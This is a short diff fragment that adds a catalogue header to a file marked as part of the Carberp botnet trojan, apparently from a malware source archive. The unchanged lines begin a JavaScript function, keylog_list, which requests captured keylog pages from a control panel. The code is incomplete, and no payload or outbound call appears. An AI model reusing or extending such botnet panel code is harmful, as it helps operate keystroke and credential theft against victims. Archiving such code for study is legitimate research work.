@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 function keylog_list (hash, trash) {
 	get_hax({
 		url: '/keylog/hash-'+hash+'.html?ajax=1&y='+trash,
